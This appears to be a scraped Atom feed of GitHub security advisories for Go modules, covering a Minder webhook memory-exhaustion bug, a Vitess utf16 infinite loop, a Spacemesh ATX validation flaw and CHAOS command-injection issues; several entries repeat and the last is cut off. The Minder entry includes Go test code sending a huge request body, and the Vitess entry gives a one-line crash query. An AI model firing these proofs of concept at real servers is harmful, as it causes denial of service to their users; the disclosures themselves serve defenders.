<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-05-12T01:27:34.796Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/stacklok/minder] Minder's GitHub Webhook Handler vulnerable to DoS from un-validated requests]]></title>
        <id>https://github.com/advisories/GHSA-9c5w-9q3f-3hv7</id>
        <link href="https://github.com/advisories/GHSA-9c5w-9q3f-3hv7"/>
        <updated>2024-05-10T21:33:55.000Z</updated>
        <content type="html"><![CDATA[<p>Minder's <code>HandleGithubWebhook</code> is susceptible to a denial of service attack from an untrusted HTTP request. The vulnerability exists before the request has been validated, and as such the request is still untrusted at the point of failure. This allows an attacker with the ability to send requests to <code>HandleGithubWebhook</code> to crash the Minder controlplane and deny other users from using it.</p>
<p>One of the first things that <code>HandleGithubWebhook</code> does is to validate the payload signature. This is done by way of the internal helper <code>validatePayloadSignature</code>:</p>
<p><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L213-L218">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L213-L218</a></p>
<p><code>validatePayloadSignature</code> generates a reader from the incoming request by way of the internal helper <code>readerFromRequest</code>:</p>
<p><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L337-L342">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L337-L342</a></p>
<p>To create a reader from the incoming request, <code>readerFromRequest</code> first reads the request body entirely into memory on line 368:</p>
<p><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L367-L377">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L367-L377</a></p>
<p>This is a vulnerability, since an HTTP request with a large body can exhaust the memory of the machine running Minder and cause the Go runtime to crash Minder.</p>
<p>Note that this occurs before Minder has validated the request, and as such, the request is still untrusted.</p>
<p>To test this out, we can use the existing <code>TestHandleWebHookRepository</code> unit test and modify the HTTP request body to be large. </p>
<p>To do that, change these lines:</p>
<p><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks_test.go#L278-L283">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks_test.go#L278-L283</a></p>
<p>... to these lines:</p>
<pre><code class="language-go">    packageJson, err := json.Marshal(event)
    require.NoError(t, err, "failed to marshal package event")

        maliciousBody := strings.NewReader(strings.Repeat("1337", 1000000000))
        maliciousBodyReader := io.MultiReader(maliciousBody, maliciousBody, maliciousBody, maliciousBody, maliciousBody)
        _ = packageJson

    client := &amp;http.Client{}
    req, err := http.NewRequest("POST", fmt.Sprintf("http://%s", addr), maliciousBodyReader)
    require.NoError(t, err, "failed to create request")
</code></pre>
<p>Then run the unit test again. WARNING, SAVE ALL WORK BEFORE DOING THIS.</p>
<p>On my local machine, this causes the machine to freeze, and Go finally performs a sigkill: </p>
<pre><code>signal: killed
FAIL      github.com/stacklok/minder/internal/controlplane          30.759s
FAIL
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/stacklok/minder/security/advisories/GHSA-9c5w-9q3f-3hv7">https://github.com/stacklok/minder/security/advisories/GHSA-9c5w-9q3f-3hv7</a></li>
<li><a href="https://github.com/stacklok/minder/commit/3e5a527d2f1b535159206161d1d519602c75bd0d">https://github.com/stacklok/minder/commit/3e5a527d2f1b535159206161d1d519602c75bd0d</a></li>
<li><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L213-L218">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L213-L218</a></li>
<li><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L337-L342">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L337-L342</a></li>
<li><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L367-L377">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks.go#L367-L377</a></li>
<li><a href="https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks_test.go#L278-L283">https://github.com/stacklok/minder/blob/ee66f6c0763212503c898cfefb65ce1450c7f5ac/internal/controlplane/handlers_githubwebhooks_test.go#L278-L283</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34084">https://nvd.nist.gov/vuln/detail/CVE-2024-34084</a></li>
<li><a href="https://github.com/advisories/GHSA-9c5w-9q3f-3hv7">https://github.com/advisories/GHSA-9c5w-9q3f-3hv7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9c5w-9q3f-3hv7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-07T13:02:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vitess.io/vitess] Vitess vulnerable to infinite memory consumption and vtgate crash]]></title>
        <id>https://github.com/advisories/GHSA-649x-hxfx-57j2</id>
        <link href="https://github.com/advisories/GHSA-649x-hxfx-57j2"/>
        <updated>2024-05-10T21:33:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When executing the following simple query, the <code>vtgate</code> will go into an endless loop that also keeps consuming memory and eventually will OOM.</p>
<h3 id="details">Details</h3>
<p>When running the following query, the <code>evalengine</code> will try evaluate it and runs forever.</p>
<pre><code>select _utf16 0xFF
</code></pre>
<p>The source of the bug lies in the collation logic that we have. The bug applies to all <code>utf16</code>,  <code>utf32</code> and <code>ucs2</code> encodings.  In general, the bug is there for any encoding where the minimal byte length for a single character is more than 1 byte.</p>
<p>The decoding functions for these collations all implement logic like the following to enforce the minimal character length:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></p>
<p>The problem is that all the callers of <code>DecodeRune</code> expect progress by returning the number of bytes consumed. This means that if there's only 1 byte left in an input, it will here return still <code>0</code> and the caller(s) don't consume the character. </p>
<p>One example of such a caller is the following:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></p>
<p>The logic here moves forward the pointer in the input <code>[]byte</code> but if <code>DecodeRune</code> returns <code>0</code> in case of error, it will keep running forever. The OOM happens since it keeps adding the <code>?</code> as the invalid character to the destination buffer infinitely, growing forever until it runs out of memory.</p>
<p>The fix here would be to always return forward progress also on invalid strings. </p>
<p>There's also a separate bug here that even if progress is guaranteed, <code>select _utf16 0xFF</code> will return the wrong result currently. MySQL will pad here the input when the <code>_utf16</code> introducer is used with leading <code>0x00</code> bytes and then decode to UTF-16, resulting in the output of <code>Ã¿</code> here. </p>
<h3 id="poc">PoC</h3>
<pre><code>select _utf16 0xFF
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service attack by triggering unbounded memory usage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2">https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df">https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055">https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d">https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202">https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32886">https://nvd.nist.gov/vuln/detail/CVE-2024-32886</a></li>
<li><a href="https://github.com/advisories/GHSA-649x-hxfx-57j2">https://github.com/advisories/GHSA-649x-hxfx-57j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-649x-hxfx-57j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-08T14:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vitess.io/vitess] Vitess vulnerable to infinite memory consumption and vtgate crash]]></title>
        <id>https://github.com/advisories/GHSA-649x-hxfx-57j2</id>
        <link href="https://github.com/advisories/GHSA-649x-hxfx-57j2"/>
        <updated>2024-05-10T21:33:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When executing the following simple query, the <code>vtgate</code> will go into an endless loop that also keeps consuming memory and eventually will OOM.</p>
<h3 id="details">Details</h3>
<p>When running the following query, the <code>evalengine</code> will try evaluate it and runs forever.</p>
<pre><code>select _utf16 0xFF
</code></pre>
<p>The source of the bug lies in the collation logic that we have. The bug applies to all <code>utf16</code>,  <code>utf32</code> and <code>ucs2</code> encodings.  In general, the bug is there for any encoding where the minimal byte length for a single character is more than 1 byte.</p>
<p>The decoding functions for these collations all implement logic like the following to enforce the minimal character length:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></p>
<p>The problem is that all the callers of <code>DecodeRune</code> expect progress by returning the number of bytes consumed. This means that if there's only 1 byte left in an input, it will here return still <code>0</code> and the caller(s) don't consume the character. </p>
<p>One example of such a caller is the following:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></p>
<p>The logic here moves forward the pointer in the input <code>[]byte</code> but if <code>DecodeRune</code> returns <code>0</code> in case of error, it will keep running forever. The OOM happens since it keeps adding the <code>?</code> as the invalid character to the destination buffer infinitely, growing forever until it runs out of memory.</p>
<p>The fix here would be to always return forward progress also on invalid strings. </p>
<p>There's also a separate bug here that even if progress is guaranteed, <code>select _utf16 0xFF</code> will return the wrong result currently. MySQL will pad here the input when the <code>_utf16</code> introducer is used with leading <code>0x00</code> bytes and then decode to UTF-16, resulting in the output of <code>Ã¿</code> here. </p>
<h3 id="poc">PoC</h3>
<pre><code>select _utf16 0xFF
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service attack by triggering unbounded memory usage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2">https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df">https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055">https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d">https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202">https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32886">https://nvd.nist.gov/vuln/detail/CVE-2024-32886</a></li>
<li><a href="https://github.com/advisories/GHSA-649x-hxfx-57j2">https://github.com/advisories/GHSA-649x-hxfx-57j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-649x-hxfx-57j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-08T14:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vitess.io/vitess] Vitess vulnerable to infinite memory consumption and vtgate crash]]></title>
        <id>https://github.com/advisories/GHSA-649x-hxfx-57j2</id>
        <link href="https://github.com/advisories/GHSA-649x-hxfx-57j2"/>
        <updated>2024-05-10T21:33:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When executing the following simple query, the <code>vtgate</code> will go into an endless loop that also keeps consuming memory and eventually will OOM.</p>
<h3 id="details">Details</h3>
<p>When running the following query, the <code>evalengine</code> will try evaluate it and runs forever.</p>
<pre><code>select _utf16 0xFF
</code></pre>
<p>The source of the bug lies in the collation logic that we have. The bug applies to all <code>utf16</code>,  <code>utf32</code> and <code>ucs2</code> encodings.  In general, the bug is there for any encoding where the minimal byte length for a single character is more than 1 byte.</p>
<p>The decoding functions for these collations all implement logic like the following to enforce the minimal character length:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></p>
<p>The problem is that all the callers of <code>DecodeRune</code> expect progress by returning the number of bytes consumed. This means that if there's only 1 byte left in an input, it will here return still <code>0</code> and the caller(s) don't consume the character. </p>
<p>One example of such a caller is the following:</p>
<p><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></p>
<p>The logic here moves forward the pointer in the input <code>[]byte</code> but if <code>DecodeRune</code> returns <code>0</code> in case of error, it will keep running forever. The OOM happens since it keeps adding the <code>?</code> as the invalid character to the destination buffer infinitely, growing forever until it runs out of memory.</p>
<p>The fix here would be to always return forward progress also on invalid strings. </p>
<p>There's also a separate bug here that even if progress is guaranteed, <code>select _utf16 0xFF</code> will return the wrong result currently. MySQL will pad here the input when the <code>_utf16</code> introducer is used with leading <code>0x00</code> bytes and then decode to UTF-16, resulting in the output of <code>Ã¿</code> here. </p>
<h3 id="poc">PoC</h3>
<pre><code>select _utf16 0xFF
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of service attack by triggering unbounded memory usage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2">https://github.com/vitessio/vitess/security/advisories/GHSA-649x-hxfx-57j2</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df">https://github.com/vitessio/vitess/commit/2fd5ba1dbf6e9b32fdfdaf869d130066b1b5c0df</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055">https://github.com/vitessio/vitess/commit/9df4b66550e46b5d7079e21ed0e1b0f49f92b055</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d">https://github.com/vitessio/vitess/commit/c46dc5b6a4329a10589ca928392218d96031ac8d</a></li>
<li><a href="https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202">https://github.com/vitessio/vitess/commit/d438adf7e34a6cf00fe441db80842ec669a99202</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/convert.go#L73-L79</a></li>
<li><a href="https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71">https://github.com/vitessio/vitess/blob/8f6cfaaa643a08dc111395a75a2d250ee746cfa8/go/mysql/collations/charset/unicode/utf16.go#L69-L71</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32886">https://nvd.nist.gov/vuln/detail/CVE-2024-32886</a></li>
<li><a href="https://github.com/advisories/GHSA-649x-hxfx-57j2">https://github.com/advisories/GHSA-649x-hxfx-57j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-649x-hxfx-57j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-08T14:32:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/spacemeshos/api] Previous ATX is not checked to be the newest valid ATX by Smesher when validating incoming ATX]]></title>
        <id>https://github.com/advisories/GHSA-jcqq-g64v-gcm7</id>
        <link href="https://github.com/advisories/GHSA-jcqq-g64v-gcm7"/>
        <updated>2024-05-10T15:33:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Nodes can publish ATXs which reference the incorrect previous ATX of the Smesher that created the ATX. ATXs are expected to form a single chain from the newest to the first ATX ever published by an identity. Allowing Smeshers to reference an earlier (but not the latest) ATX as previous breaks this protocol rule and can serve as an attack vector where Nodes are rewarded for holding their PoST data for less than one epoch but still being eligible for rewards.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>API needs to be extended to be able to fetch events from a node that dected malicious behavior of this regard by the node</li>
<li>go-spacemesh needs to be patched to a) not allow publishing these ATXs any more and b) create malfeasance proofs for identities that published invalid ATXs in the past.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>n/a</p>
<h3 id="references">References</h3>
<p>Spacemesh protocol whitepaper: <a href="https://spacemesh.io/blog/spacemesh-white-paper-1/">https://spacemesh.io/blog/spacemesh-white-paper-1/</a>, specifically sections 4.4.2 ("ATX Contents") and 4.4.3 ("ATX validity")</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/spacemeshos/go-spacemesh/security/advisories/GHSA-jcqq-g64v-gcm7">https://github.com/spacemeshos/go-spacemesh/security/advisories/GHSA-jcqq-g64v-gcm7</a></li>
<li><a href="https://github.com/spacemeshos/api/commit/1d5bd972bbe225d024c3e0ae5214ddb6b481716e">https://github.com/spacemeshos/api/commit/1d5bd972bbe225d024c3e0ae5214ddb6b481716e</a></li>
<li><a href="https://github.com/spacemeshos/go-spacemesh/commit/9aff88d54be809ac43d60e8a8b4d65359c356b87">https://github.com/spacemeshos/go-spacemesh/commit/9aff88d54be809ac43d60e8a8b4d65359c356b87</a></li>
<li><a href="https://spacemesh.io/blog/spacemesh-white-paper-1">https://spacemesh.io/blog/spacemesh-white-paper-1</a></li>
<li><a href="https://github.com/advisories/GHSA-jcqq-g64v-gcm7">https://github.com/advisories/GHSA-jcqq-g64v-gcm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jcqq-g64v-gcm7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-10T15:33:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/spacemeshos/go-spacemesh] Previous ATX is not checked to be the newest valid ATX by Smesher when validating incoming ATX]]></title>
        <id>https://github.com/advisories/GHSA-jcqq-g64v-gcm7</id>
        <link href="https://github.com/advisories/GHSA-jcqq-g64v-gcm7"/>
        <updated>2024-05-10T15:33:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Nodes can publish ATXs which reference the incorrect previous ATX of the Smesher that created the ATX. ATXs are expected to form a single chain from the newest to the first ATX ever published by an identity. Allowing Smeshers to reference an earlier (but not the latest) ATX as previous breaks this protocol rule and can serve as an attack vector where Nodes are rewarded for holding their PoST data for less than one epoch but still being eligible for rewards.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>API needs to be extended to be able to fetch events from a node that dected malicious behavior of this regard by the node</li>
<li>go-spacemesh needs to be patched to a) not allow publishing these ATXs any more and b) create malfeasance proofs for identities that published invalid ATXs in the past.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>n/a</p>
<h3 id="references">References</h3>
<p>Spacemesh protocol whitepaper: <a href="https://spacemesh.io/blog/spacemesh-white-paper-1/">https://spacemesh.io/blog/spacemesh-white-paper-1/</a>, specifically sections 4.4.2 ("ATX Contents") and 4.4.3 ("ATX validity")</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/spacemeshos/go-spacemesh/security/advisories/GHSA-jcqq-g64v-gcm7">https://github.com/spacemeshos/go-spacemesh/security/advisories/GHSA-jcqq-g64v-gcm7</a></li>
<li><a href="https://github.com/spacemeshos/api/commit/1d5bd972bbe225d024c3e0ae5214ddb6b481716e">https://github.com/spacemeshos/api/commit/1d5bd972bbe225d024c3e0ae5214ddb6b481716e</a></li>
<li><a href="https://github.com/spacemeshos/go-spacemesh/commit/9aff88d54be809ac43d60e8a8b4d65359c356b87">https://github.com/spacemeshos/go-spacemesh/commit/9aff88d54be809ac43d60e8a8b4d65359c356b87</a></li>
<li><a href="https://spacemesh.io/blog/spacemesh-white-paper-1">https://spacemesh.io/blog/spacemesh-white-paper-1</a></li>
<li><a href="https://github.com/advisories/GHSA-jcqq-g64v-gcm7">https://github.com/advisories/GHSA-jcqq-g64v-gcm7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jcqq-g64v-gcm7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-10T15:33:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/tiagorlampert/CHAOS] tiagorlampert CHAOS vulnerable to Cross Site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-c5rv-hjjc-jv7m</id>
        <link href="https://github.com/advisories/GHSA-c5rv-hjjc-jv7m"/>
        <updated>2024-05-10T14:25:00.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting vulnerability in tiagorlampert CHAOS v.5.0.1 allows a remote attacker to escalate privileges via the sendCommandHandler function in the handler.go component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-31839">https://nvd.nist.gov/vuln/detail/CVE-2024-31839</a></li>
<li><a href="https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents">https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents</a></li>
<li><a href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a></li>
<li><a href="https://github.com/advisories/GHSA-c5rv-hjjc-jv7m">https://github.com/advisories/GHSA-c5rv-hjjc-jv7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c5rv-hjjc-jv7m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-12T15:37:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/tiagorlampert/CHAOS] tiagorlampert CHAOS vulnerable to command injections]]></title>
        <id>https://github.com/advisories/GHSA-p3j6-f45h-hw5f</id>
        <link href="https://github.com/advisories/GHSA-p3j6-f45h-hw5f"/>
        <updated>2024-05-09T18:36:35.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in tiagorlampert CHAOS v5.0.1 allows a remote attacker to execute arbitrary code via the BuildClient function within client_service.go</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-30850">https://nvd.nist.gov/vuln/detail/CVE-2024-30850</a></li>
<li><a href="https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents">https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-33434">https://nvd.nist.gov/vuln/detail/CVE-2024-33434</a></li>
<li><a href="https://github.com/tiagorlampert/CHAOS/pull/95">https://github.com/tiagorlampert/CHAOS/pull/95</a></li>
<li><a href="https://github.com/tiagorlampert/CHAOS/commit/1b451cf62582295b7225caf5a7b506f0bad56f6b">https://github.com/tiagorlampert/CHAOS/commit/1b451cf62582295b7225caf5a7b506f0bad56f6b</a></li>
<li><a href="https://github.com/tiagorlampert/CHAOS/commit/24c9e109b5be34df7b2bce8368eae669c481ed5e">https://github.com/tiagorlampert/CHAOS/commit/24c9e109b5be34df7b2bce8368eae669c481ed5e</a></li>
<li><a href="https://gist.github.com/slimwang/d1ec6645ba9012a551ea436679244496">https://gist.github.com/slimwang/d1ec6645ba9012a551ea436679244496</a></li>
<li><a href="https://github.com/advisories/GHSA-p3j6-f45h-hw5f">https://github.com/advisories/GHSA-p3j6-f45h-hw5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p3j6-f45h-hw5f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-12T06:33:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/tiagorlampert/CHAOS] tiagorlampert CHAOS vulnerable to arbitrary code execution]]></title>
        <id>https://github.com/advisories/GHSA-xfjj-f699-rc79</id>
        <link href="https://github.com/advisories/GHSA-xfjj-f699-rc79"/>
        <updated>2024-05-09T18:36:27.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in tiagorlampert CHAOS before 1b451cf62582295b7225caf5a7b506f0bad56f6b and 24c9e109b5be34df7b2bce8368eae669c481ed5e allows a remote attacker to execute arbitrary code via the unsafe concatenation of the <code>filename</code> argument into the <code>buildStr</code> string without any sanitization or filtering.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-33434">https://nvd.nist.gov/vuln/detail/CVE-2024-33434</a></li>
<li><a href="https://github.com/tiagorlampert/CHAOS/pull/95">https://github.com/tiagorlampert/CHAOS/pull/95</a></li>
<li><a href="https://gist.github.com/slimwang/d1ec6645ba9012a551ea436679244496">https://gist.github.com/slimwang/d1ec6645ba9012a551ea436679244496</a></li>
